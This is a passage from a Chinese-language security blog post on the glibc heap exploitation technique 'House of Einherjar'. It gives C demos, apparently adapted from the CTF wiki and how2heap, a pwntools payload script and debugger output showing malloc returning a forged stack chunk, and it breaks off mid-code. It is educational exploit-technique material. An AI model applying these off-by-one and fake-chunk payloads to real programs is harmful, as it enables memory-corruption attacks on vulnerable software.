<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
    <meta name="description" content="House Of Einherjar2.23一般就是有off by one可以覆盖previnuse位，释放时会触发下面的合并 &#x2F;* consolidate backward *&#x2F;if (!prev_inuse(p)) &amp;#123;    prevsize &#x3D; prev_size(p);    size +&#x3D; prevsize;    p &#x3D; chunk_at_offset(p, -((long)">
<meta property="og:type" content="article">
<meta property="og:title" content="House Of Einherjar">
<meta property="og:url" content="https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/index.html">
<meta property="og:site_name" content="Grxer&#39;s Blog">
<meta property="og:description" content="House Of Einherjar2.23一般就是有off by one可以覆盖previnuse位，释放时会触发下面的合并 &#x2F;* consolidate backward *&#x2F;if (!prev_inuse(p)) &amp;#123;    prevsize &#x3D; prev_size(p);    size +&#x3D; prevsize;    p &#x3D; chunk_at_offset(p, -((long)">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/image-20230730141511488.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/image-20230730142117126.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/image-20230730142455457.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/image-20230730142640857.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/image-20230730223649416.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/image-20230730224051202.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/image-20230730224245777.png">
<meta property="article:published_time" content="2023-07-29T12:02:08.000Z">
<meta property="article:modified_time" content="2023-09-16T09:43:51.288Z">
<meta property="article:author" content="bxz">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/image-20230730141511488.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>House Of Einherjar</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 lrt">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/08/01/Englishlearning-August2023/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&text=House Of Einherjar"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&is_video=false&description=House Of Einherjar"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=House Of Einherjar&body=Check out this article: https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&name=House Of Einherjar&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&t=House Of Einherjar"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-Of-Einherjar"><span class="toc-number">1.</span> <span class="toc-text">House Of Einherjar</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-23"><span class="toc-number">1.1.</span> <span class="toc-text">2.23</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wiki%E4%B8%8A%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">wiki上的例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#how2heap%E4%BE%8B%E5%AD%90"><span class="toc-number">1.1.2.</span> <span class="toc-text">how2heap例子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-31"><span class="toc-number">1.2.</span> <span class="toc-text">2.31</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#how2heap%E4%BE%8B%E5%AD%90-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">how2heap例子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2016-Seccon-tinypad"><span class="toc-number">1.3.</span> <span class="toc-text">2016 Seccon tinypad</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        House Of Einherjar
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">bxz</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-07-29T12:02:08.000Z" itemprop="datePublished">2023-07-29</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h1><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><p>一般就是有off by one可以覆盖previnuse位，释放时会触发下面的合并</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="wiki上的例子"><a href="#wiki上的例子" class="headerlink" title="wiki上的例子"></a>wiki上的例子</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span>* s0 = <span class="built_in">malloc</span>(<span class="number">0x200</span>);　<span class="comment">//构造fake chunk</span></span><br><span class="line">    <span class="type">char</span>* s1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">char</span>* s2 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);　</span><br><span class="line">    <span class="type">char</span>* s3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>); <span class="comment">//为了不让s2与top chunk 合并</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;begin\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, s0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input s0\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s0, <span class="number">0x200</span>); <span class="comment">//读入fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input s1\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s1, <span class="number">0x19</span>); <span class="comment">//Off By One</span></span><br><span class="line">    <span class="built_in">free</span>(s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./example&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;begin\n&quot;</span>)</span><br><span class="line">address = <span class="type">int</span>(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;input s0\n&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(address) * <span class="number">2</span> + <span class="string">&quot;A&quot;</span>*<span class="number">0xe0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p64(address) * <span class="number">2</span>是为了绕过</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x100</span>) <span class="meta">#fake size</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;input s1\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x220</span>) + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>

<p>在s1通过堆块的空间复用，在s2的prevsize写上0x220,并用off by one把previnuse位置零，</p>
<p>s2堆情况</p>
<p><img src="/2023/07/29/House-Of-Einherjar/image-20230730141511488.png" alt="image-20230730141511488"></p>
<p>s1-prevsize找到假堆块进行unlink操作，假堆块s0还需要绕过unlink里下面的检查</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) \</span><br><span class="line">malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure>

<p>下面的图if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0)) \绕过</p>
<p><img src="/2023/07/29/House-Of-Einherjar/image-20230730142117126.png" alt="image-20230730142117126"></p>
<p>下面的图if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))\绕过</p>
<p><img src="/2023/07/29/House-Of-Einherjar/image-20230730142455457.png" alt="image-20230730142455457"></p>
<p>free(s2)后就可以把s0 0x7ac010放入unsortedbin了</p>
<p><img src="/2023/07/29/House-Of-Einherjar/image-20230730142640857.png" alt="image-20230730142640857"></p>
<h3 id="how2heap例子"><a href="#how2heap例子" class="headerlink" title="how2heap例子"></a>how2heap例子</h3><p>来自hollk师傅博客的简化版，上一个例子如果把伪造堆伪造到栈上会因为堆块太大，导致申请不出来，办法就是和topchunk合并后申请</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="comment">//gcc -g hollk.c -o hollk //glibc-2.23  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span>* a;</span><br><span class="line">  <span class="type">uint8_t</span>* b;</span><br><span class="line">  <span class="type">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line">  a = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding:%#x\n&quot;</span>, real_a_size);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//在栈上伪造fake chunk</span></span><br><span class="line">  <span class="type">size_t</span> fake_chunk[<span class="number">6</span>]; </span><br><span class="line">  fake_chunk[<span class="number">0</span>] = <span class="number">0</span>; </span><br><span class="line">  fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>;</span><br><span class="line">  fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  fake_chunk[<span class="number">4</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  fake_chunk[<span class="number">5</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);</span><br><span class="line"></span><br><span class="line">  b = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">  <span class="comment">//模拟off by one将b previnuse位置零</span></span><br><span class="line">  a[real_a_size] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((b - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>) - (<span class="type">uint8_t</span>*)fake_chunk);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//模拟利用地址复用写b的prevsize</span></span><br><span class="line">  *(<span class="type">size_t</span>*)&amp;a[real_a_size - <span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"><span class="comment">//绕过unlink /if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))  检查</span></span><br><span class="line">  fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"><span class="comment">//unlink合并后会和topchunk合并</span></span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">//可以把fake_chunk申请出来</span></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/h/glibc_2<span class="number">.31</span>&gt; ./a.out</span><br><span class="line">a: <span class="number">0xccf010</span></span><br><span class="line">Since we want to overflow <span class="string">&#x27;a&#x27;</span>, we need the <span class="string">&#x27;real&#x27;</span> size of <span class="string">&#x27;a&#x27;</span> after rounding:<span class="number">0x38</span></span><br><span class="line">Our fake chunk at <span class="number">0x7fff767b3280</span> looks like:</span><br><span class="line">b: <span class="number">0xccf050</span></span><br><span class="line"></span><br><span class="line">b.size: <span class="number">0x101</span></span><br><span class="line">b.size: <span class="number">0x100</span></span><br><span class="line">Our fake prev_size will be <span class="number">0xccf040</span> - <span class="number">0x7fff767b3280</span> = <span class="number">0xffff80008a51bdc0</span></span><br><span class="line">Our fake chunk size is now <span class="number">0xffff80008a53cd81</span> (b.size + fake_prev_size)</span><br><span class="line">Next <span class="built_in">malloc</span>(<span class="number">0x200</span>) is at <span class="number">0x7fff767b3290</span></span><br></pre></td></tr></table></figure>

<p>绕过unlink大小的检测只需要*(fake_chunk+size)&#x3D;size就行了，所以可以用下面的方法，用下面的方法因为时0x100大小是unsortedbin就不用把largebin才会用到的fd_nextsize和bk_nextsize覆写了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> fake_chunk[<span class="number">6</span>]; </span><br><span class="line">fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; </span><br><span class="line">fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>;</span><br><span class="line">fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line"><span class="comment">/* fake_chunk[4] = (size_t)fake_chunk; */</span></span><br><span class="line"><span class="comment">/* fake_chunk[5] = (size_t)fake_chunk; */</span></span><br><span class="line">fake_chunk[<span class="number">0x100</span>/<span class="number">8</span>]=<span class="number">0x100</span>;<span class="comment">//绕过if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))  </span></span><br><span class="line">把后面的fake_chunk[<span class="number">1</span>] = fake_size;注释掉</span><br></pre></td></tr></table></figure>

<h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><h3 id="how2heap例子-1"><a href="#how2heap例子-1" class="headerlink" title="how2heap例子"></a>how2heap例子</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prepare the target</span></span><br><span class="line">  <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span>*)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// create a fake chunk</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">  a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">  a[<span class="number">2</span>] = (<span class="type">size_t</span>)a; <span class="comment">// fwd</span></span><br><span class="line">  a[<span class="number">3</span>] = (<span class="type">size_t</span>)a; <span class="comment">// bck</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);</span><br><span class="line">  <span class="type">uint8_t</span>* b = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">   * a value of 0x00. The least significant byte of this will be 0x00, because the size of</span></span><br><span class="line"><span class="comment">   * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);</span><br><span class="line">  <span class="type">uint8_t</span>* c = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span>* c_size_ptr = (<span class="type">uint64_t</span>*)(c - <span class="number">8</span>);</span><br><span class="line">  <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//覆写c的previnuse位为0</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">  b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">    <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">  <span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>) - (<span class="type">uint8_t</span>*)a);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">  <span class="comment">//覆写c的prevsize</span></span><br><span class="line">  *(<span class="type">size_t</span>*)&amp;b[real_b_size - <span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new 